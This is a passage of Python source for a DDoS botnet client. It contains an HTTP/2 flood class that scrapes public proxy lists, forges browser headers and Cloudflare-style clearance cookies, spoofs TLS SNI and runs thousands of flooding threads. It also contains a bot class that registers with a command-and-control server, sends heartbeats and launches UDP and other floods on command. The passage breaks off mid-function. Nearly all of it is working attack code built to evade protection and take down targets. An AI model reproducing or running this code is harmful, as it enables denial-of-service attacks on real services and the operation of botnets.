        """Start the enhanced HTTP/HTTPS bypass flood attack"""
        protocol = "HTTPS" if self.ssl else "HTTP"

        print(f"[+] Starting ADVANCED {protocol} Bypass Flood Attack")
        print(f"[+] Target: {self.target_ip}:{self.port}")
        print(f"[+] Method: {self.method} | Duration: {self.duration}s")
        print(f"[+] Threads: {self.num_threads} | SSL: {self.ssl}")
        print(f"[+] Path: {self.path}")
        print("[+] Stop Command: Enabled (Immediate stop support)")

        # Store thread references for management
        self.threads = []
        for i in range(self.num_threads):
            if self.stop_event.is_set() or not self.running:
                break
            thread = threading.Thread(target=self.http_flood_worker, args=(i,), daemon=True)
            self.threads.append(thread)
            thread.start()
        
        try:
            start_time = time.time()
            last_connections = 0
            last_successful = 0
            
            while (time.time() - start_time < self.duration and 
                   self.running and 
                   not self.stop_event.is_set()):
                
                elapsed = int(time.time() - start_time)
                remaining = self.duration - elapsed
                
                current_connections = self.connection_count
                current_successful = self.successful_requests
                
                cps = current_connections - last_connections
                rps = current_successful - last_successful
                
                last_connections = current_connections
                last_successful = current_successful
                
                success_rate = (current_successful / (current_successful + self.failed_requests * 100)) if (current_successful + self.failed_requests) > 0 else 100
                
                # Add stop status to display
                stop_status = " [STOPPED]" if self.stop_event.is_set() else ""
                print(f"\r[+] Time: {elapsed}s | Remaining: {remaining}s | "
                      f"Connections: {current_connections} | Successful: {current_successful} | "
                      f"CPS: {cps}/s | RPS: {rps}/s{stop_status}", end="", flush=True)
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\n[+] Stopping attack due to keyboard interrupt...")
            self.stop()
        finally:
            # Ensure everything is stopped
            self.stop()
            
            total_requests = self.successful_requests + self.failed_requests
            success_rate = (self.successful_requests / total_requests * 100) if total_requests > 0 else 0
            
            print(f"\n[+] Attack completed.")
            print(f"[+] Total connections: {self.connection_count}")
            print(f"[+] Total requests: {total_requests}")
            print(f"[+] Successful requests: {self.successful_requests}")
            print(f"[+] Failed requests: {self.failed_requests}")
            print(f"[+] Success rate: {success_rate:.1f}%")
            if (time.time() - start_time) > 0:
                print(f"[+] Average RPS: {self.successful_requests / (time.time() - start_time):.1f}/s")
            else:
                print("[+] Attack stopped immediately")
            
        return f"Advanced HTTP flood completed: {self.target_ip}:{self.port} for {self.duration}s"

    def stop(self):
        """Immediate and aggressive stop method"""
        self.log("STOP COMMAND RECEIVED - Stopping all threads")
        self.running = False
        self.stop_event.set()  # Set stop event

        # Force close any sockets that might be created
        if hasattr(self, 'active_sockets'):
            for sock in self.active_sockets:
                try:
                    sock.close()
                except:
                    pass
                
        # Wait for threads to terminate with timeout
        for thread in self.threads:
            thread.join(timeout=5.0)  # 1 second timeout

        self.log(f"All threads stopped. Final stats: {self.successful_requests} successful requests")



# =========================
# Enhanced HTTP/2 Flood Attack Class with Realistic Headers & In-Memory Proxies
# =========================
class HTTP2RushFlood:
    def __init__(self, target_ip, port, duration, method="GET", path="/", ssl=True, proxy_sources=None):
        self.target_ip = target_ip
        self.port = port
        self.duration = duration
        self.method = method.upper()
        self.path = path
        self.ssl = ssl
        self.num_threads = 2000
        self.running = True
        self.stop_event = threading.Event()
        self.connection_count = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.goaway_count = 0
        self.proxy_list = []
        self.proxy_index = 0
        self.proxy_lock = threading.Lock()
        self.proxy_stats = {"working": 0, "dead": 0, "total": 0}
        
        # Proxy sources
        self.proxy_sources = proxy_sources or [
            'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
            'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
            'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
            'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
            'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
            'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
            'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
            'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
            'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
            'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'http://worm.rip/http.txt',
            'https://proxyspace.pro/http.txt',
            'https://proxy-spider.com/api/proxies.example.txt',
            'http://193.200.78.26:8000/http?key=free'
        ]
        
        # HTTP/2 specific settings
        self.custom_table = 65535
        self.custom_window = 6291456
        self.custom_header = 262144
        self.custom_update = 15663105
        
        # Enhanced header components
        self.cookie_templates = [
            "_ga_YNWG1736LP=GS2.1.{timestamp}$o2$g1$t{timestamp}$j59$l0$h0",
            "cf_clearance={random_hash}-{timestamp}-1.2.1.1-{random_string}",
            "_ga=GA1.1.{random_number}.{timestamp}",
            "__cf_bm={random_hash}-{timestamp}-1.0.1.1-{random_string}",
            "session_{random_id}={random_hash}",
            "user_token={random_hash}",
            "auth_{random_id}={random_string}"
        ]
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0"
        ]
        
        self.accept_languages = [
            "en-US,en;q=0.9",
            "en-US,en;q=0.8",
            "en-GB,en;q=0.9",
            "en-CA,en;q=0.9",
            "en-AU,en;q=0.9"
        ]
        
        self.accept_encodings = [
            "gzip, deflate, br",
            "gzip, deflate",
            "br, gzip, deflate"
        ]
        
        self.referers = [
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://www.facebook.com/",
            "https://twitter.com/",
            "https://www.reddit.com/",
            "https://www.youtube.com/",
            "https://www.linkedin.com/",
            f"https://{self.target_ip}/",
            f"https://{self.target_ip}/home",
            f"https://{self.target_ip}/index.html"
        ]

    def log(self, message):
        """Log messages for HTTP/2 flood"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [HTTP2] {message}")

    def generate_random_hash(self, length=32):
        """Generate random hash string"""
        return hashlib.md5(os.urandom(32)).hexdigest()[:length]

    def generate_random_string(self, length=16):
        """Generate random alphanumeric string"""
        chars = string.ascii_letters + string.digits
        return ''.join(random.choice(chars) for _ in range(length))

    def generate_random_cookie(self):
        """Generate realistic random cookies"""
        timestamp = str(int(time.time()))
        random_number = random.randint(1000000000, 9999999999)
        
        template = random.choice(self.cookie_templates)
        cookie = template.format(
            timestamp=timestamp,
            random_hash=self.generate_random_hash(),
            random_string=self.generate_random_string(20),
            random_number=random_number,
            random_id=random.randint(1000, 9999)
        )
        
        return cookie

    def generate_cookie_header(self):
        """Generate complete Cookie header with multiple cookies"""
        num_cookies = random.randint(2, 4)
        cookies = [self.generate_random_cookie() for _ in range(num_cookies)]
        return "; ".join(cookies)

    def generate_realistic_headers(self, stream_id):
        """Generate realistic HTTP/2 headers like the example"""
        methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE']
        method = random.choice(methods)
        
        headers = [
            (':method', method),
            (':authority', self.target_ip),
            (':scheme', 'https'),
            (':path', self.path),
            ('cookie', self.generate_cookie_header()),
            ('user-agent', random.choice(self.user_agents)),
            ('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
            ('accept-language', random.choice(self.accept_languages)),
            ('accept-encoding', random.choice(self.accept_encodings)),
            ('referer', random.choice(self.referers)),
            ('upgrade-insecure-requests', '1'),
            ('sec-fetch-dest', 'document'),
            ('sec-fetch-mode', 'navigate'),
            ('sec-fetch-site', random.choice(['same-origin', 'cross-site', 'none'])),
            ('sec-fetch-user', '?1'),
            ('priority', random.choice(['u=0, i', 'u=1, i', 'u=0,1', 'u=1'])),
            ('te', 'trailers')
        ]
        
        # Add some optional headers randomly
        if random.random() > 0.5:
            headers.append(('cache-control', random.choice(['no-cache', 'max-age=0', 'no-store'])))
        
        if random.random() > 0.7:
            headers.append(('dnt', random.choice(['1', '0'])))
        
        # Shuffle headers for more realism
        random.shuffle(headers)
        
        return headers

    async def scrape_proxies_async(self):
        """Asynchronously scrape proxies from all sources (memory only)"""
        import aiohttp
        import asyncio
        
        self.log("Starting proxy scraping (in-memory)...")
        all_proxies = set()
        
        async def fetch_proxies(session, url):
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    if response.status == 200:
                        text = await response.text()
                        proxies = set()
                        for line in text.split('\n'):
                            line = line.strip()
                            if line and ':' in line and not line.startswith('#'):
                                parts = line.split(':')
                                if len(parts) >= 2:
                                    ip = parts[0]
                                    port = parts[1]
                                    if self.is_valid_ip(ip) and port.isdigit():
                                        proxies.add(f"{ip}:{port}")
                        return proxies
            except Exception as e:
                self.log(f"Failed to scrape {url}: {e}")
            return set()
        
        async with aiohttp.ClientSession() as session:
            tasks = []
            for source in self.proxy_sources:
                tasks.append(fetch_proxies(session, source))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if isinstance(result, set):
                    all_proxies.update(result)
        
        self.proxy_list = list(all_proxies)
        self.proxy_stats["total"] = len(self.proxy_list)
        self.log(f"Scraped {len(self.proxy_list)} proxies (in memory) from {len(self.proxy_sources)} sources")
        return self.proxy_list

    def scrape_proxies_sync(self):
        """Synchronous proxy scraping (memory only)"""
        import requests
        
        self.log("Starting proxy scraping (sync, in-memory)...")
        all_proxies = set()
        
        for source in self.proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    for line in response.text.split('\n'):
                        line = line.strip()
                        if line and ':' in line and not line.startswith('#'):
                            parts = line.split(':')
                            if len(parts) >= 2:
                                ip = parts[0]
                                port = parts[1]
                                if self.is_valid_ip(ip) and port.isdigit():
                                    all_proxies.add(f"{ip}:{port}")
                self.log(f"Scraped from {source}: {len(all_proxies)} proxies so far")
            except Exception as e:
                self.log(f"Failed to scrape {source}: {e}")
        
        self.proxy_list = list(all_proxies)
        self.proxy_stats["total"] = len(self.proxy_list)
        self.log(f"Total scraped proxies (in memory): {len(self.proxy_list)}")
        return self.proxy_list

    def is_valid_ip(self, ip):
        """Validate IP address format"""
        try:
            socket.inet_pton(socket.AF_INET, ip)
            return True
        except socket.error:
            try:
                socket.inet_pton(socket.AF_INET6, ip)
                return True
            except socket.error:
                return False

    def get_next_proxy(self):
        """Get next proxy with round-robin rotation"""
        with self.proxy_lock:
            if not self.proxy_list:
                return None
            proxy = self.proxy_list[self.proxy_index]
            self.proxy_index = (self.proxy_index + 1) % len(self.proxy_list)
            return proxy

    def create_proxied_http2_socket(self, proxy):
        """Create HTTP/2 socket through proxy"""
        try:
            import ssl
            
            proxy_host, proxy_port = proxy.split(':')
            proxy_port = int(proxy_port)
            
            # Connect to proxy first
            proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            proxy_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
            proxy_sock.settimeout(10)
            
            proxy_sock.connect((proxy_host, proxy_port))
            
            # Send CONNECT request to proxy
            connect_request = f"CONNECT {self.target_ip}:{self.port} HTTP/1.1\r\nHost: {self.target_ip}:{self.port}\r\nProxy-Connection: Keep-Alive\r\n\r\n"
            proxy_sock.send(connect_request.encode())
            
            # Read proxy response
            response = b""
            while b"\r\n\r\n" not in response:
                chunk = proxy_sock.recv(4096)
                if not chunk:
                    raise Exception("Proxy connection failed")
                response += chunk
            
            if b"200" not in response:
                raise Exception(f"Proxy rejected connection: {response[:200]}")
            
            # Now wrap with TLS for HTTP/2
            if self.ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.options |= ssl.OP_NO_SSLv2
                context.options |= ssl.OP_NO_SSLv3
                context.options |= ssl.OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION
                context.set_ciphers('TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384')
                context.set_alpn_protocols(['h2', 'http/1.1'])
                
                # SNI spoofing
                sni_hosts = [self.target_ip, 'www.google.com', 'www.cloudflare.com', 'www.facebook.com']
                sni_hostname = random.choice(sni_hosts)
                
                ssl_sock = context.wrap_socket(
                    proxy_sock,
                    server_hostname=sni_hostname,
                    do_handshake_on_connect=True
                )
                
                return ssl_sock
            
            return proxy_sock
            
        except Exception as e:
            self.log(f"Proxy connection failed ({proxy}): {e}")
            return None

    def send_http2_preface(self, sock):
        """Send HTTP/2 connection preface"""
        try:
            preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
            sock.send(preface)
            return True
        except:
            return False

    def encode_frame(self, stream_id, frame_type, payload=b'', flags=0):
        """Encode HTTP/2 frame"""
        frame = bytearray(9)
        length = len(payload)
        frame[0:3] = length.to_bytes(3, 'big')
        frame[3] = frame_type
        frame[4] = flags
        frame[5:9] = stream_id.to_bytes(4, 'big')
        frame.extend(payload)
        return bytes(frame)

    def send_http2_settings(self, sock):
        """Send HTTP/2 settings frame"""
        try:
            settings = [
                (0x1, self.custom_header),   # HEADER_TABLE_SIZE
                (0x2, 0),                   # ENABLE_PUSH
                (0x3, self.custom_window),  # MAX_CONCURRENT_STREAMS
                (0x4, self.custom_window),  # INITIAL_WINDOW_SIZE
                (0x5, self.custom_table),   # MAX_FRAME_SIZE
            ]
            
            payload = b''
            for setting in settings:
                payload += setting[0].to_bytes(2, 'big') + setting[1].to_bytes(4, 'big')
            
            settings_frame = self.encode_frame(0, 0x4, payload)
            sock.send(settings_frame)
            
            # Send WINDOW_UPDATE frame
            window_update = self.custom_update.to_bytes(4, 'big')
            window_frame = self.encode_frame(0, 0x8, window_update)
            sock.send(window_frame)
            
            return True
        except:
            return False

    def create_http2_headers_frame(self, stream_id):
        """Create HTTP/2 headers frame with realistic headers"""
        headers = self.generate_realistic_headers(stream_id)
        
        # Simple header encoding (simplified)
        header_block = b''
        for name, value in headers:
            header_block += len(name).to_bytes(1, 'big') + name.encode()
            header_block += len(value).to_bytes(1, 'big') + value.encode()
        
        flags = 0x4 | 0x1  # END_HEADERS | END_STREAM
        headers_frame = self.encode_frame(stream_id, 0x1, header_block, flags)
        
        return headers_frame

    def http2_flood_worker(self, worker_id):
        """HTTP/2 flood worker with proxy rotation and realistic headers"""
        try:
            start_time = time.time()
            rate_per_second = random.randint(50, 100)  # Dynamic rate
            
            while (self.running and 
                   not self.stop_event.is_set() and 
                   time.time() - start_time < self.duration):
                
                proxy = self.get_next_proxy()
                if not proxy:
                    self.log(f"Worker {worker_id}: No proxies available")
                    time.sleep(1)
                    continue
                
                try:
                    # Create proxied connection
                    sock = self.create_proxied_http2_socket(proxy)
                    if not sock:
                        self.failed_requests += 1
                        continue
                    
                    self.connection_count += 1
                    
                    # Perform HTTP/2 handshake
                    if not self.send_http2_preface(sock):
                        sock.close()
                        continue
                    
                    if not self.send_http2_settings(sock):
                        sock.close()
                        continue
                    
                    # Send multiple streams with realistic headers
                    stream_id = 1
                    requests_in_connection = random.randint(10, 30)
                    
                    for _ in range(requests_in_connection):
                        if self.stop_event.is_set() or not self.running:
                            break
                        
                        try:
                            headers_frame = self.create_http2_headers_frame(stream_id)
                            sock.send(headers_frame)
                            
                            self.successful_requests += 1
                            stream_id += 2
                            
                            time.sleep(1.0 / rate_per_second)
                            
                        except (BrokenPipeError, ConnectionResetError, socket.timeout):
                            self.failed_requests += 1
                            break
                    
                    sock.close()
                    
                except (socket.timeout, ConnectionRefusedError, ConnectionResetError) as e:
                    self.failed_requests += 1
                    time.sleep(0.1)
                except Exception as e:
                    self.failed_requests += 1
                    time.sleep(0.1)
                    
        except Exception as e:
            self.log(f"Worker {worker_id} error: {e}")

    def scrape_and_start(self):
        """Scrape proxies to memory and start attack"""
        self.log("Starting in-memory proxy scraping phase...")
        
        # Try async scraping first, fallback to sync
        try:
            import asyncio
            asyncio.run(self.scrape_proxies_async())
        except:
            self.scrape_proxies_sync()
        
        if not self.proxy_list:
            self.log("No proxies found! Starting direct attack...")
            # Fallback to direct connection
            self.proxy_list = [None]
        else:
            self.log(f"Successfully loaded {len(self.proxy_list)} proxies in memory")
            
            # Quick proxy test
            self.log("Quick proxy connectivity check...")
            working_count = 0
            test_proxies = random.sample(self.proxy_list, min(5, len(self.proxy_list)))
            for proxy in test_proxies:
                try:
                    proxy_host, proxy_port = proxy.split(':')
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((proxy_host, int(proxy_port)))
                    sock.close()
                    working_count += 1
                except:
                    pass
            
            self.log(f"Proxy quick test: {working_count}/{len(test_proxies)} responsive")
        
        # Start the actual attack
        self.start_attack()

    def start_attack(self):
        """Start the actual HTTP/2 flood attack"""
        print(f"[🚀] STARTING HTTP/2 RUSH FLOOD ATTACK")
        print(f"[🎯] Target: {self.target_ip}:{self.port}")
        print(f"[⏱️] Duration: {self.duration}s")
        print(f"[👥] Threads: {self.num_threads}")
        print(f"[🔌] Proxies: {len(self.proxy_list)} in memory")
        print(f"[⚡] Protocol: HTTP/2 with Realistic Headers")
        print(f"[🔧] Features:")
        print("    ✓ Realistic Browser Headers")
        print("    ✓ Random Cookies & User-Agents")
        print("    ✓ Proxy Rotation (Memory Only)")
        print("    ✓ HTTP/2 Multiplexing")
        print("    ✓ TLS 1.3 Optimization")
        print("    ✓ Mixed HTTP Methods")
        print("    ✓ Auto Proxy Scraping")

        self.threads = []
        for i in range(self.num_threads):
            if self.stop_event.is_set() or not self.running:
                break
            thread = threading.Thread(target=self.http2_flood_worker, args=(i,), daemon=True)
            self.threads.append(thread)
            thread.start()

        try:
            start_time = time.time()
            last_requests = 0
            
            while (time.time() - start_time < self.duration and 
                   self.running and 
                   not self.stop_event.is_set()):
                
                elapsed = int(time.time() - start_time)
                remaining = self.duration - elapsed
                
                current_requests = self.successful_requests
                rps = current_requests - last_requests
                last_requests = current_requests
                
                proxy_info = f" | Proxies: {len(self.proxy_list)}" if self.proxy_list and self.proxy_list[0] is not None else " | Direct"
                stop_status = " [STOPPED]" if self.stop_event.is_set() else ""
                
                print(f"\r[🔥] Time: {elapsed}s | RPS: {rps}/s | Total: {current_requests:,} | Conns: {self.connection_count}{proxy_info}{stop_status}", 
                      end="", flush=True)
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n[🛑] EMERGENCY STOP!")
        finally:
            self.stop()
            
            total_time = time.time() - start_time
            if total_time > 0:
                avg_rps = self.successful_requests / total_time
                success_rate = (self.successful_requests / (self.successful_requests + self.failed_requests)) * 100 if (self.successful_requests + self.failed_requests) > 0 else 0
                
                print(f"\n[✅] HTTP/2 ATTACK COMPLETED")
                print(f"[📊] FINAL STATISTICS:")
                print(f"    Total Requests: {self.successful_requests:,}")
                print(f"    Failed Requests: {self.failed_requests:,}")
                print(f"    Connections Made: {self.connection_count:,}")
                print(f"    Proxies Used: {len(self.proxy_list)}")
                print(f"    Average RPS: {avg_rps:.1f}/s")
                print(f"    Success Rate: {success_rate:.1f}%")
            else:
                print(f"\n[✅] HTTP/2 ATTACK STOPPED IMMEDIATELY")

    def start(self):
        """Main start method - begins with proxy scraping to memory"""
        self.scrape_and_start()

    def stop(self):
        """Stop the HTTP/2 flood attack"""
        self.running = False
        self.stop_event.set()
        self.log("STOP command received - Stopping all threads")
        
        for thread in self.threads:
            thread.join(timeout=5.0)
        
        # Clear proxy list from memory
        self.proxy_list.clear()
        self.log("All HTTP/2 flood threads stopped - Proxies cleared from memory")



# =========================
# Bot Functions
# =========================
class BotClient:
    def __init__(self):
        self.socket = None
        self.connected = False
        self.running = True
        self.last_heartbeat = time.time()
        self.start_time = time.time()
        self.debug = True
        
        # Support multiple concurrent attacks
        self.active_attacks = {}  # attack_id -> {thread, attack_obj, start_time, type}
        self.attack_counter = 0
        self.attack_lock = threading.Lock()
    
    def log(self, message):
        """Log messages with timestamp"""
        if self.debug:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] {message}")
    
    def generate_attack_id(self):
        """Generate unique attack ID"""
        with self.attack_lock:
            self.attack_counter += 1
            return f"attack_{self.attack_counter}_{int(time.time())}"
        
    def is_attack_running(self):
        """Check if any attacks are running"""
        with self.attack_lock:
            return len(self.active_attacks) > 0
    
    def stop_all_attacks(self):
        """Stop all running attacks"""
        with self.attack_lock:
            for attack_id, attack_info in list(self.active_attacks.items()):
                try:
                    if hasattr(attack_info['attack_obj'], 'stop'):
                        attack_info['attack_obj'].stop()
                    elif hasattr(attack_info['attack_obj'], 'stop_attack'):
                        attack_info['attack_obj'].stop_attack()
                    attack_info['thread'].join(timeout=5.0)
                except Exception as e:
                    self.log(f"Error stopping attack {attack_id}: {e}")
                finally:
                    del self.active_attacks[attack_id]
            self.log("All attacks stopped")
        
    def stop_attack_by_id(self, attack_id):
        """Stop specific attack by ID - SIMPLIFIED"""
        self.log(f"Stopping attack: {attack_id}")

        with self.attack_lock:
            # Try exact match first
            if attack_id in self.active_attacks:
                attack_info = self.active_attacks[attack_id]
                attack_obj = attack_info['attack_obj']

                # Stop the attack object
                if hasattr(attack_obj, 'running'):
                    attack_obj.running = False
                if hasattr(attack_obj, 'stop_event'):
                    attack_obj.stop_event.set()
                if hasattr(attack_obj, 'stop'):
                    attack_obj.stop()

                del self.active_attacks[attack_id]
                return True

            # Try partial match for numeric IDs
            for existing_id in list(self.active_attacks.keys()):
                if existing_id.endswith(attack_id) or attack_id in existing_id:
                    attack_info = self.active_attacks[existing_id]
                    attack_obj = attack_info['attack_obj']

                    # Stop the attack object
                    if hasattr(attack_obj, 'running'):
                        attack_obj.running = False
                    if hasattr(attack_obj, 'stop_event'):
                        attack_obj.stop_event.set()
                    if hasattr(attack_obj, 'stop'):
                        attack_obj.stop()

                    del self.active_attacks[existing_id]
                    return True

        return False

    def _stop_attack_thread(self, attack_info):
        """Helper method to stop an attack thread aggressively - ENHANCED"""
        try:
            attack_obj = attack_info['attack_obj']
            thread = attack_info['thread']

            self.log(f"Aggressively stopping attack: {type(attack_obj).__name__}")

            # Method 1: Set running flag IMMEDIATELY
            if hasattr(attack_obj, 'running'):
                attack_obj.running = False
                self.log("✓ Set running=False")

            # Method 2: Use stop event if available
            if hasattr(attack_obj, 'stop_event'):
                attack_obj.stop_event.set()
                self.log("✓ Set stop_event")

            # Method 3: Call stop methods
            if hasattr(attack_obj, 'stop'):
                attack_obj.stop()
                self.log("✓ Called stop() method")
            elif hasattr(attack_obj, 'stop_attack'):
                attack_obj.stop_attack()
                self.log("✓ Called stop_attack() method")

            # Method 4: Force close any sockets
            socket_attrs = ['sockets', 'sockets_pool', 'active_sockets']
            for attr in socket_attrs:
                if hasattr(attack_obj, attr):
                    sockets = getattr(attack_obj, attr)
                    if isinstance(sockets, list):
                        for sock in sockets:
                            try:
                                sock.close()
                                self.log(f"✓ Closed socket from {attr}")
                            except:
                                pass

            # Method 5: If it's a specific attack type, use type-specific stops
            attack_type = attack_info.get('type', '')
            if attack_type == 'udp_flood' and hasattr(attack_obj, 'threads'):
                for t in attack_obj.threads:
                    try:
                        t.join(timeout=1.0)
                    except:
                        pass

            # Wait for thread to finish with timeout
            thread.join(timeout=3.0)

            # Check if thread stopped
            if thread.is_alive():
                self.log("⚠️ Thread still alive after stop attempts")
                return False
            else:
                self.log("✓ Thread stopped successfully")
                return True

        except Exception as e:
            self.log(f"❌ Error stopping attack thread: {e}")
            return False

    def cleanup_completed_attacks(self):
        """Remove completed attacks from tracking"""
        with self.attack_lock:
            completed_attacks = []
            for attack_id, attack_info in self.active_attacks.items():
                if not attack_info['thread'].is_alive():
                    completed_attacks.append(attack_id)
            
            for attack_id in completed_attacks:
                del self.active_attacks[attack_id]
                
            return len(completed_attacks)
    
    def get_active_attacks_info(self):
        """Get information about all active attacks"""
        with self.attack_lock:
            attacks_info = []
            for attack_id, attack_info in self.active_attacks.items():
                attacks_info.append({
                    'id': attack_id,
                    'type': attack_info['type'],
                    'target': attack_info.get('target', 'Unknown'),
                    'duration': attack_info.get('duration', 0),
                    'running_time': time.time() - attack_info['start_time'],
                    'thread_alive': attack_info['thread'].is_alive()
                })
            return attacks_info
    
    def get_active_attack_count(self):
        """Thread-safe way to get active attack count"""
        with self.attack_lock:
            return len(self.active_attacks)
        
        
    def connect_to_server(self):
        """Establish connection to CNC server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(5)
            self.log(f"Attempting to connect to {CNC_SERVER_IP}:{CNC_SERVER_PORT}")
            self.socket.connect((CNC_SERVER_IP, CNC_SERVER_PORT))
            
            identification = {
                    "type": "connect",
                    "bot_id": BOT_ID,
                    "version": BOT_VERSION,
                    "system": SYSTEM_INFO,
                    "status": "ready",
                    "capabilities": ["udp_flood", "tcp_flood", "universal_tcp_bypass", "ssh_flood", 
                                    "http_flood", "http2_flood", "http2_rush", "cosmic_h1", "cosmic_h2", "status"]
                }
            self.socket.send(json.dumps(identification).encode())
            
            self.connected = True
            self.last_heartbeat = time.time()
            self.log(f"Connected to CosmicNetwork as {BOT_ID}")
            return True
            
        except Exception as e:
            self.log(f"Connection failed: {e}")
            self.connected = False
            return False
    
    def send_heartbeat(self):
        """Send heartbeat to server with multiple attack support"""
        if not self.connected:
            return
            
        try:
            active_attacks_info = self.get_active_attacks_info()
            
            heartbeat = {
                "type": "heartbeat",
                "bot_id": BOT_ID,
                "timestamp": time.time(),
                "status": "active",
                "active_attacks_count": len(active_attacks_info),
                "active_attacks": active_attacks_info,
                "uptime": round(time.time() - self.start_time, 2)
            }
            self.socket.send(json.dumps(heartbeat).encode())
            self.last_heartbeat = time.time()
            self.log(f"Heartbeat sent - Active attacks: {len(active_attacks_info)}")
        except Exception as e:
            self.log(f"Heartbeat failed: {e}")
            self.connected = False

    

    
    def handle_command(self, command_data):
        """Process commands from CNC server"""
        try:
            self.log(f"Raw command received: {command_data}")
    
            # Extract command
            if isinstance(command_data, dict):
                cmd_str = command_data.get("command", "").strip()
            elif isinstance(command_data, str):
                cmd_str = command_data.strip()
            else:
                cmd_str = str(command_data).strip()
    
            self.log(f"Processing command: '{cmd_str}'")
    
            # Handle stop command FIRST
            if cmd_str.startswith("!stop"):
                self.log(f"STOP COMMAND DETECTED: {cmd_str}")
                parts = cmd_str.split()
                self.log(f"Stop command parts: {parts}")

                # Show current active attacks for debugging
                active_attacks = self.get_active_attacks_info()
                self.log(f"Current active attacks: {len(active_attacks)}")
                for attack in active_attacks:
                    self.log(f"  - {attack['id']}: {attack['type']} {attack['target']}")

                # Clean up completed attacks first
                cleaned = self.cleanup_completed_attacks()
                if cleaned > 0:
                    self.log(f"Cleaned up {cleaned} completed attacks")

                if len(parts) >= 2:
                    attack_id_to_stop = parts[1]
                    self.log(f"Looking for attack ID: {attack_id_to_stop}")

                    # Try to stop by exact match first
                    if self.stop_attack_by_id(attack_id_to_stop):
                        return f"Stopped attack: {attack_id_to_stop}"
                    else:
                        # If exact match fails, try partial matching
                        found = False
                        with self.attack_lock:
                            for attack_id in list(self.active_attacks.keys()):
                                # Try to match by the numeric part or partial ID
                                if (attack_id_to_stop in attack_id or 
                                    attack_id.endswith(attack_id_to_stop)):
                                    self.log(f"Partial match found: {attack_id}")
                                    if self.stop_attack_by_id(attack_id):
                                        return f"Stopped attack: {attack_id}"
                                    found = True
                                    break
                                
                        if not found:
                            return f"No attack found with ID: {attack_id_to_stop}"
                else:
                    # If no ID specified, stop the first active attack
                    active_attacks = self.get_active_attacks_info()
                    if active_attacks:
                        attack_id = active_attacks[0]['id']
                        self.log(f"Auto-selecting first active attack: {attack_id}")
                        if self.stop_attack_by_id(attack_id):
                            return f"Stopped attack: {attack_id} (auto-selected)"
                        else:
                            return "Failed to stop the attack"
                    else:
                        return "No active attacks found"

            if cmd_str.startswith("!udp"):
                parts = cmd_str.split()
                if len(parts) >= 5:
                    ip, port, duration, attack_id = parts[1], parts[2], parts[3], parts[4]
                    #attack_id = self.generate_attack_id()
                    
                    def start_udp_attack(attack_id, ip, port, duration):
                        try:
                            self.log(f"Starting UDP attack {attack_id} on {ip}:{port} for {duration}s")
                            flooder = GigabitUDPFlooder(ip, int(port), int(duration))
                            
                            # Store attack info
                            with self.attack_lock:
                                self.active_attacks[attack_id] = {
                                    'thread': threading.current_thread(),
                                    'attack_obj': flooder,
                                    'start_time': time.time(),
                                    'type': 'udp_flood',
                                    'target': f"{ip}:{port}",
                                    'duration': duration
                                }
                            
                            flooder.start_gigabit_attack()
                            
